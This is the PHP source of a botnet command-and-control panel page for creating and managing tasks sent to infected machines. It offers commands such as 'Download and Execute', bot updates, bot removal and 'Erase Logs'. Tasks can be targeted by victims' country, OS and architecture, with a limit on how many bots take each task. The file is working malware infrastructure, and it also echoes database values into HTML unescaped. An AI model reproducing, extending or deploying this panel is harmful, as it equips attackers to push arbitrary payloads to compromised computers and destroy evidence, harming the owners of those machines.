<?php

require_once('inc/require.php');
require_once('inc/load.php');

if(isset($_POST['add']))
{
if(!isset($_POST['os']) || !isset($_POST['task']) || !isset($_POST['country']) || !isset($_POST['arch']))
	echo ('All fields is required.');
else if(count($_POST['os'])==0 || count($_POST['country'])==0 || count($_POST['arch'])==0) 
	echo ('All fields is required.');
else
{

$task = mysql_real_escape_string($_POST['task']);
$os = mysql_real_escape_string(implode(',',$_POST['os']));
$country = mysql_real_escape_string(implode(',',$_POST['country']));
$arch = mysql_real_escape_string(implode(',',$_POST['arch']));
$limit = (int)$_POST['limit'];

if($limit<1) $limit = $_vars['default_limit'];

if($task=='Remove Bot' || $task=='Erase Logs') $need_file = false; else $need_file =true;


if($need_file)
{
$md5 = mysql_real_escape_string($_POST['file']);

$sqlFind = mysql_query("SELECT filename FROM uploads WHERE `md5`='$md5'");
if(mysql_num_rows($sqlFind)>0)  { 
	$r = mysql_fetch_row($sqlFind);
	$file = $r[0];
	}
else exit ('File not found.');
}

$hashtask = md5($task.$file.$os.$country.$arch.$limit.$time);

$sqlQuery = "INSERT INTO tasks SET command_name='$task', `md5`='$md5', task_hash='$hashtask', file='$file', os='$os', country='$country', arch='$arch', `limit`='$limit', enabled='0', sends='0', status='New'";

$res = mysql_query($sqlQuery);
if($res) exit ('<script>location.href="?"</script>');

}
}


if(isset($_GET['delete']))
{
$hash = mysql_real_escape_string($_GET['delete']);

$res= mysql_query("DELETE FROM tasks WHERE task_hash='$hash'");
if($res) exit ('<script>location.href="?"</script>');
}




if(isset($_GET['change_status']))
{
$hash = mysql_real_escape_string($_GET['change_status']);
$status = mysql_fetch_row(mysql_query("SELECT enabled FROM tasks WHERE task_hash='$hash'"));
$status = $status[0];

if($status==1){ $enabled = 0; $status = 'Stopped'; $lastStart = 'last_start';} else{ $enabled=1; $status = 'Enabled'; $lastStart=$time;}

$res= mysql_query("UPDATE tasks SET enabled='$enabled', status='$status', last_start=$lastStart WHERE task_hash='$hash'");
if($res) exit ('<script>location.href="?"</script>');
}





?>  
  <div class="row-fluid" style="width:500px">
                        <div class="span12">
                            <div class="widget">
                                <div class="widget-title">
                                    <div class="icon"><i class="icon20 i-stack-checkmark"></i></div> 
                                    <h4>New task</h4>
                                    <a href="#" class="minimize"></a>
                                </div><!-- End .widget-title -->
                            
                                <div class="widget-content">
                                    <form method="post" action="?new_task=true" class="form-horizontal">
                                        <div class="control-group">
                                            <label class="control-label" for="required">Command</label>
                                            <div class="controls controls-row">
                                                <select name="task" required="required" onChange="changeTask(this.value)">
                                                <option>Update Secure</option>
												<option>Update Normal</option>
                                                <option>Download and Execute</option>
                                                <option>Remove Bot</option>
                                                <option>Erase Logs</option>
                                                
                                                </select>
                                            </div>
                                        </div><!-- End .control-group  -->
                                        <div class="control-group" id="filesGRoup">
                                            <label class="control-label" for="required">File</label>
                                            <div class="controls controls-row">
                                                <select name="file" onChange="document.getElementById('md5_file').innerHTML='<br>MD5: '+this.value">
                                                <option value="" SELECTED></option>
												<?php
                                                
												
$res = mysql_query("SELECT  `filename`, `md5` FROM uploads ORDER BY date DESC");
if(mysql_num_rows($res)>0)
{

while($sqlRes = mysql_fetch_row($res))
{

echo '<option value="'.$sqlRes[1].'">'.$sqlRes[0].'</option>'."\r\n";
}

}
												
												
												?>
												</select> <span id="md5_file">&nbsp;</span>
                                            </div>
                                        </div><!-- End .control-group  -->
                                     
                                     
                                               <div class="control-group">
                                            <label class="control-label" for="required">Country</label>
                                            <div class="controls controls-row">
                                            <select name="country[]" multiple="multiple[]" style="height:60px">
                                            
                                            <?php
											
											$sqlObj = mysql_query("SELECT country FROM bots GROUP by country ASC");
											while($sqlRes = mysql_fetch_row($sqlObj))
											{
											echo '<option value="'.$sqlRes[0].'"  SELECTED>'.$sqlRes[0].'</option>'."\r\n";
											}
											
											?>
                                            </select>
                                            </div>
                                        </div><!-- End .control-group  -->
                                        
                                        
                                        
                                     
                                     
                                                           <div class="control-group">
                                            <label class="control-label" for="required">OS</label>
                                            <div class="controls controls-row">
                                                 <select name="os[]" multiple="multiple[]" style="height:60px">
                                            
                                            <?php
											
											$sqlObj = mysql_query("SELECT os FROM bots GROUP by os ASC");
											while($sqlRes = mysql_fetch_row($sqlObj))
											{
											echo '<option value="'.$sqlRes[0].'" SELECTED>'.$sqlRes[0].'</option>'."\r\n";
											}
											
											?>
                                            </select>
                                            </div>
                                        </div><!-- End .control-group  -->
                                        
                                        
                                        
                                     
                                                           <div class="control-group">
                                            <label class="control-label" for="required">Arch</label>
                                            <div class="controls controls-row">
                                                 <select name="arch[]" multiple="multiple[]" style="height:60px">
                                           
                                            <?php
											
											$sqlObj = mysql_query("SELECT arch FROM bots GROUP by arch ASC");
											while($sqlRes = mysql_fetch_row($sqlObj))
											{
											echo '<option value="'.$sqlRes[0].'" SELECTED>'.$sqlRes[0].'</option>'."\r\n";
											}
											
											?>
                                            </select>
                                            </div>
                                        </div><!-- End .control-group  -->
                                        
                                        
                                        
                                        
                                                           <div class="control-group">
                                            <label class="control-label" for="required">Limit</label>
                                            <div class="controls controls-row">
                                            <input type="text" name="limit" value="" />
                                            </div>
                                        </div><!-- End .control-group  -->
                                        
                                            <button type="submit" name="add" class="btn btn-primary">Add task</button>
                                           
                                    </form>
                                </div><!-- End .widget-content -->
                            </div><!-- End .widget -->
                        </div><!-- End .span12  --> 
                        
                        
                        
                        
                        
                        
                        
                        
                        </div>
                        
                        
                        
                                   <div class="row-fluid">

                        <div class="span12">

                            <div class="widget">
                                <div class="widget-title">
                                    <div class="icon"><i class="icon20 i-table"></i></div> 
                                    <h4>Tasks</h4>
                                    <a href="#" class="minimize"></a>
                                </div><!-- End .widget-title -->
                            
                                <div class="widget-content">
                                    
                                    <table cellpadding="0" cellspacing="0" border="0" class="table table-striped table-bordered table-hover" id="dataTable">
                                              <thead>
                                            <tr>
                                                <th width="12%">Command</th>
                                                <th width="15%">File</th>
                                                <th width="5%">Limit</th>
                                                <th width="5%">Sends</th>
                                                <th width="10%">Country</th>
                                                <th width="10%">OS</th>
                                                <th width="7%">Arch</th>
                                                <th width="10%">Status</th>
                                                <th width="7%">Action</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                        
                                        <?php
										
										
										
										$strSQL = "SELECT COUNT(*) FROM tasks ";

$objQuery = mysql_query($strSQL) or die ("Error Query [".$strSQL."]");
$Num_Rows = mysql_fetch_row($objQuery);
$Num_Rows = (int)$Num_Rows[0];


$Per_Page = $_vars['limit_entries'];

if (!isset($_GET['Page'])) {
    $Page = 1;
} else {
    $Page = (int)$_GET['Page'];
}

$Prev_Page = $Page - 1;
$Next_Page = $Page + 1;

$Page_Start = (($Per_Page * $Page) - $Per_Page);
if ($Num_Rows <= $Per_Page) {
    $Num_Pages = 1;
} elseif (($Num_Rows % $Per_Page) == 0) {
    $Num_Pages = ($Num_Rows / $Per_Page) ;
} else {
    $Num_Pages = ($Num_Rows / $Per_Page) + 1;
    $Num_Pages = (int) $Num_Pages;
}

											$objQuery = mysql_query("SELECT * FROM tasks ORDER BY task_id DESC LIMIT $Page_Start , $Per_Page");
                                        while($row= mysql_fetch_array($objQuery))
                                        {
                                        echo '
                                        
                                            <tr class="gradeA">
                                                <td class="center vcenter">'.$row['command_name'].'</td>
                                                <td class="center vcenter">';
                                                
												if($row['command_name']=='Erase Logs' || $row['command_name']=='Remove Bot')
												{
												echo 'N/A';
												}
												else
												 echo $row['file'].'<br><small>'.$row['md5'];
												 
												echo '</small></td>
                                                <td class="center vcenter">'.$row['limit'].'</td>
                                                <td class="center vcenter">'.$row['sends'].'</td>
                                                <td class="center vcenter">'.$row['country'].'</td>
                                                <td class="center vcenter">'.$row['os'].'</td>
                                                <td class="center vcenter">'.$row['arch'].'</td>
                                                <td class="center vcenter">'.$row['status'].'</td>

                                                <td class="center vcenter">
                                                    <div class="btn-group">
                                                        <a href="?change_status='.$row['task_hash'].'" class="btn tip" title="">';
                                                         if($row['enabled']=='0') echo 'enable'; else echo 'disable';
														 echo '</i></a>
                                                        <a href="?delete='.$row['task_hash'].'" class="btn tip" title="">del</i></a>
                                                    </div>
                                                </td>
                                            </tr>';
                                          
										   }
										   ?>
                                           
                                        </tbody>
                                      
                                    </table>
                                    
                                    
                                    <?php
									
echo"                                    Showing $Page_Start to $Per_Page of $Num_Rows entries";


									if ($Prev_Page) {
    echo " <a href ='$_SERVER[SCRIPT_NAME]?Page=$Prev_Page'><< Back</a> ";
}

for ($i=1; $i <= $Num_Pages; $i++) {
    if ($i != $Page) {
        echo " <a href ='$_SERVER[SCRIPT_NAME]?Page=$i'>$i</a> ";
    } else {
        echo "<b> $i </b>"; 
    }
}

if ($Page!=$Num_Pages) {
    echo " <a href ='$_SERVER[SCRIPT_NAME]?Page=$Next_Page'>Next>></a> ";        
}
?>
                                    
                                </div><!-- End .widget-content -->
                            </div><!-- End .widget -->
                        </div><!-- End .span12  --> 
                                            
                    </div><!-- End .row-fluid  -->
                    
                    
                    